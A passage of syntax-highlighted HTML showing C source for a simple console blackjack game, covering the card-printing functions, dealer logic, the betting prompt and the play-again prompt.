class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Diamond Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, diamond);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125;<span class="comment">// End function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">heartcard</span><span class="params">()</span> <span class="comment">//Displays Heart Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart); </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Heart Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, heart);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">spadecard</span><span class="params">()</span> <span class="comment">//Displays Spade Card Image</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     </span><br><span class="line">     </span><br><span class="line">    srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">    k=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k&lt;=<span class="number">9</span>) <span class="comment">//If random number is 9 or less, print card with that number</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  %d  |\n&quot;</span>, k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">10</span>) <span class="comment">//If random number is 10, print card with J (Jack) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  J  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">11</span>) <span class="comment">//If random number is 11, print card with A (Ace) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  A  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(player_total&lt;=<span class="number">10</span>) <span class="comment">//If random number is Ace, change value to 11 or 1 depending on dealer total</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             k=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">12</span>) <span class="comment">//If random number is 12, print card with Q (Queen) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  Q  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">13</span>) <span class="comment">//If random number is 13, print card with K (King) on face</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="comment">//Spade Card</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|%c    |\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|  K  |\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;|    %c|\n&quot;</span>, spade);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------\n&quot;</span>);</span><br><span class="line">    k=<span class="number">10</span>; <span class="comment">//Set card value to 10</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> k;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">randcard</span><span class="params">()</span> <span class="comment">//Generates random card</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">                </span><br><span class="line">     srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>)); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">     random_card = rand()%<span class="number">4</span>+<span class="number">1</span>;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">1</span>)</span><br><span class="line">     &#123;   </span><br><span class="line">         clubcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">2</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         diamondcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">3</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         heartcard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;</span><br><span class="line">          </span><br><span class="line">     <span class="keyword">if</span>(random_card==<span class="number">4</span>)</span><br><span class="line">     &#123;</span><br><span class="line">         spadecard();</span><br><span class="line">         l=k;</span><br><span class="line">     &#125;    </span><br><span class="line">     <span class="keyword">return</span> l;</span><br><span class="line">&#125; <span class="comment">// End Function   </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span> <span class="comment">//Plays game</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">int</span> p=<span class="number">0</span>; <span class="comment">// holds value of player_total</span></span><br><span class="line">     <span class="keyword">int</span> i=<span class="number">1</span>; <span class="comment">// counter for asking user to hold or stay (aka game turns)</span></span><br><span class="line">     <span class="keyword">char</span> choice3;</span><br><span class="line">      </span><br><span class="line">     cash = cash;</span><br><span class="line">     cash_test();</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nCash: $%d\n&quot;</span>,cash); <span class="comment">//Prints amount of cash user has</span></span><br><span class="line">     randcard(); <span class="comment">//Generates random card</span></span><br><span class="line">     player_total = p + l; <span class="comment">//Computes player total</span></span><br><span class="line">     p = player_total;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nYour Total is %d\n&quot;</span>, p); <span class="comment">//Prints player total</span></span><br><span class="line">     dealer(); <span class="comment">//Computes and prints dealer total</span></span><br><span class="line">     betting(); <span class="comment">//Prompts user to enter bet amount</span></span><br><span class="line">        </span><br><span class="line">     <span class="keyword">while</span>(i&lt;=<span class="number">21</span>) <span class="comment">//While loop used to keep asking user to hit or stay at most twenty-one times</span></span><br><span class="line">                  <span class="comment">//  because there is a chance user can generate twenty-one consecutive 1&#x27;s</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="keyword">if</span>(p==<span class="number">21</span>) <span class="comment">//If user total is 21, win</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nUnbelievable! You Win!\n&quot;</span>);</span><br><span class="line">             won = won+<span class="number">1</span>;</span><br><span class="line">             cash = cash+bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&gt;<span class="number">21</span>) <span class="comment">//If player total is over 21, loss</span></span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nWoah Buddy, You Went WAY over.\n&quot;</span>);</span><br><span class="line">             loss = loss+<span class="number">1</span>;</span><br><span class="line">             cash = cash - bet;</span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">             dealer_total=<span class="number">0</span>;</span><br><span class="line">             askover();</span><br><span class="line">         &#125;</span><br><span class="line">      </span><br><span class="line">         <span class="keyword">if</span>(p&lt;=<span class="number">21</span>) <span class="comment">//If player total is less than 21, ask to hit or stay</span></span><br><span class="line">         &#123;         </span><br><span class="line">             <span class="built_in">printf</span>(<span class="string">&quot;\n\nWould You Like to Hit or Stay?&quot;</span>);</span><br><span class="line">              </span><br><span class="line">             <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>, &amp;choice3);</span><br><span class="line">             <span class="keyword">while</span>((choice3!=<span class="string">&#x27;H&#x27;</span>) &amp;&amp; (choice3!=<span class="string">&#x27;h&#x27;</span>) &amp;&amp; (choice3!=<span class="string">&#x27;S&#x27;</span>) &amp;&amp; (choice3!=<span class="string">&#x27;s&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">             &#123;                                                                           </span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;Please Enter H to Hit or S to Stay.\n&quot;</span>);</span><br><span class="line">                 <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice3);</span><br><span class="line">             &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">&#x27;H&#x27;</span>) || (choice3==<span class="string">&#x27;h&#x27;</span>)) <span class="comment">// If Hit, continues</span></span><br><span class="line">             &#123; </span><br><span class="line">                 randcard();</span><br><span class="line">                 player_total = p + l;</span><br><span class="line">                 p = player_total;</span><br><span class="line">                 <span class="built_in">printf</span>(<span class="string">&quot;\nYour Total is %d\n&quot;</span>, p);</span><br><span class="line">                 dealer();</span><br><span class="line">                  <span class="keyword">if</span>(dealer_total==<span class="number">21</span>) <span class="comment">//Is dealer total is 21, loss</span></span><br><span class="line">                  &#123;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nDealer Has the Better Hand. You Lose.\n&quot;</span>);</span><br><span class="line">                      loss = loss+<span class="number">1</span>;</span><br><span class="line">                      cash = cash - bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125; </span><br><span class="line">      </span><br><span class="line">                  <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer total is over 21, win</span></span><br><span class="line">                  &#123;                      </span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nDealer Has Went Over!. You Win!\n&quot;</span>);</span><br><span class="line">                      won = won+<span class="number">1</span>;</span><br><span class="line">                      cash = cash+bet;</span><br><span class="line">                      <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">                      dealer_total=<span class="number">0</span>;</span><br><span class="line">                      askover();</span><br><span class="line">                  &#125;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span>((choice3==<span class="string">&#x27;S&#x27;</span>) || (choice3==<span class="string">&#x27;s&#x27;</span>)) <span class="comment">// If Stay, does not continue</span></span><br><span class="line">             &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\nYou Have Chosen to Stay at %d. Wise Decision!\n&quot;</span>, player_total);</span><br><span class="line">                stay();</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">             i++; <span class="comment">//While player total and dealer total are less than 21, re-do while loop </span></span><br><span class="line">     &#125; <span class="comment">// End While Loop</span></span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dealer</span><span class="params">()</span> <span class="comment">//Function to play for dealer AI</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">int</span> z;</span><br><span class="line">      </span><br><span class="line">     <span class="keyword">if</span>(dealer_total&lt;<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      srand((<span class="keyword">unsigned</span>) time(<span class="literal">NULL</span>) + <span class="number">1</span>); <span class="comment">//Generates random seed for rand() function</span></span><br><span class="line">      z=rand()%<span class="number">13</span>+<span class="number">1</span>;</span><br><span class="line">      <span class="keyword">if</span>(z&lt;=<span class="number">10</span>) <span class="comment">//If random number generated is 10 or less, keep that value</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=z;</span><br><span class="line">          </span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z&gt;<span class="number">11</span>) <span class="comment">//If random number generated is more than 11, change value to 10</span></span><br><span class="line">      &#123;</span><br><span class="line">         d=<span class="number">10</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span>(z==<span class="number">11</span>) <span class="comment">//If random number is 11(Ace), change value to 11 or 1 depending on dealer total</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span>(dealer_total&lt;=<span class="number">10</span>)</span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">11</span>;</span><br><span class="line">         &#125;</span><br><span class="line">          </span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">         &#123;</span><br><span class="line">             d=<span class="number">1</span>;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">     dealer_total = dealer_total + d;</span><br><span class="line">     &#125;</span><br><span class="line">           </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nThe Dealer Has a Total of %d&quot;</span>, dealer_total); <span class="comment">//Prints dealer total</span></span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stay</span><span class="params">()</span> <span class="comment">//Function for when user selects &#x27;Stay&#x27;</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     dealer(); <span class="comment">//If stay selected, dealer continues going</span></span><br><span class="line">     <span class="keyword">if</span>(dealer_total&gt;=<span class="number">17</span>)</span><br><span class="line">     &#123;</span><br><span class="line">      <span class="keyword">if</span>(player_total&gt;=dealer_total) <span class="comment">//If player&#x27;s total is more than dealer&#x27;s total, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nUnbelievable! You Win!\n&quot;</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(player_total&lt;dealer_total) <span class="comment">//If player&#x27;s total is less than dealer&#x27;s total, loss</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nDealer Has the Better Hand. You Lose.\n&quot;</span>);</span><br><span class="line">         loss = loss+<span class="number">1</span>;</span><br><span class="line">         cash = cash - bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(dealer_total&gt;<span class="number">21</span>) <span class="comment">//If dealer&#x27;s total is more than 21, win</span></span><br><span class="line">      &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nUnbelievable! You Win!\n&quot;</span>);</span><br><span class="line">         won = won+<span class="number">1</span>;</span><br><span class="line">         cash = cash+bet;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;\nYou have %d Wins and %d Losses. Awesome!\n&quot;</span>, won, loss);</span><br><span class="line">         dealer_total=<span class="number">0</span>;</span><br><span class="line">         askover();</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">     &#123;</span><br><span class="line">         stay();</span><br><span class="line">     &#125;</span><br><span class="line">      </span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cash_test</span><span class="params">()</span> <span class="comment">//Test for if user has cash remaining in purse</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (cash &lt;= <span class="number">0</span>) <span class="comment">//Once user has zero remaining cash, game ends and prompts user to play again</span></span><br><span class="line">     &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;You Are Bankrupt. Game Over&quot;</span>);</span><br><span class="line">        cash = <span class="number">500</span>;</span><br><span class="line">        askover();</span><br><span class="line">     &#125;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">betting</span><span class="params">()</span> <span class="comment">//Asks user amount to bet</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;\n\nEnter Bet: $&quot;</span>);</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;bet);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">if</span> (bet &gt; cash) <span class="comment">//If player tries to bet more money than player has</span></span><br><span class="line"> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nYou cannot bet more money than you have.&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nEnter Bet: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;bet);</span><br><span class="line">        <span class="keyword">return</span> bet;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span> <span class="keyword">return</span> bet;</span><br><span class="line">&#125; <span class="comment">// End Function</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">askover</span><span class="params">()</span> <span class="comment">// Function for asking player if they want to play again</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> choice1;</span><br><span class="line">         </span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nWould You Like To Play Again?&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;\nPlease Enter Y for Yes or N for No\n&quot;</span>);</span><br><span class="line">     <span class="built_in">scanf</span>(<span class="string">&quot;\n%c&quot;</span>,&amp;choice1);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">while</span>((choice1!=<span class="string">&#x27;Y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;y&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;N&#x27;</span>) &amp;&amp; (choice1!=<span class="string">&#x27;n&#x27;</span>)) <span class="comment">// If invalid choice entered</span></span><br><span class="line">    &#123;                                                                           </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Incorrect Choice. Please Enter Y for Yes or N for No.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%c&quot;</span>,&amp;choice1);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>((choice1 == <span class="string">&#x27;Y&#x27;</span>) || (choice1 == <span class="string">&#x27;y&#x27;</span>)) <span class="comment">// If yes, continue.</span></span><br><span 